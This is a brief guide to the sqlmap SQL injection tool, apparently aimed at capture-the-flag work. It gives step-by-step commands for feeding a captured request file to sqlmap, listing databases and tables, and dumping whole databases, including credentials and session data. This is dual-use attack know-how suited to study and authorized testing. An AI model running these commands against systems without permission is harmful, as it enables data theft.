# sqlmap Usage Guide

## Introduction

`sqlmap` is an open-source penetration testing tool specifically designed to automate the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of SQL injection techniques and is highly effective at identifying various database backends such as MySQL, PostgreSQL, Oracle, Microsoft SQL Server, and others. This guide provides a step-by-step approach to effectively use sqlmap for exploiting SQL injection vulnerabilities in web applications.

## Installation

To install the latest version of `sqlmap`, run the following command:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

This clones the repository with the latest code and places it in a directory named sqlmap-dev.
## Usage
### General Workflow

Follow these steps to test a web application for SQL injection vulnerabilities using sqlmap:

1. Capture the POST request: First, capture the POST request made by the client (usually after login) using a proxy tool such as Burp Suite or Wireshark.
2. Identify the Vulnerable Parameter: Locate the parameter in the captured request that may be vulnerable to SQL injection. This is typically a user input field, like the username or password field.
3. Create the Request File: Place the entire captured POST request in a plain text file (e.g., r.txt). Make sure to replace the vulnerable parameter value with * to indicate the location of the SQL injection.
4. Run sqlmap: Execute sqlmap with the -r option, providing the request file as input.
```
python3 ./sqlmap-dev/sqlmap.py -r r.txt
```
5. Display Database Tables: To list all tables in the database, add the --tables option to the command.
```
python3 ./sqlmap-dev/sqlmap.py -r r.txt --tables
```
### Advanced Commands
#### Dumping Specific Values from Tables

To dump specific values from a table, use the following command. This will dump the contents of the specified table (flag in this case).
```
python3 ./sqlmap-dev/sqlmap.py -r FILE.txt --dump -T flag
```
#### Listing Available Databases

To find all the databases used by the web application, execute the following command:
```
python3 ./sqlmap-dev/sqlmap.py -r y.txt --dbs
```
#### Dumping Data from a Database

To dump all data from a specific database, use the -D option followed by the database name and the --dump-all flag:
```
python3 ./sqlmap-dev/sqlmap.py -r FILE.txt -D DATABASE_NAME --dump-all
```
This command will extract all the data from the specified database, which may include sensitive information such as user credentials, session data, and other critical information.
### Additional Options and Features

- level: Adjust the level of tests performed (1 to 5). Higher levels result in more thorough testing but can take longer to complete.

- risk: Modify the risk level of tests (1 to 3). Higher risk may expose more vulnerabilities but could be more intrusive.

- batch: Run sqlmap without user interaction. This is useful for automating tests in scripts or continuous integration pipelines.
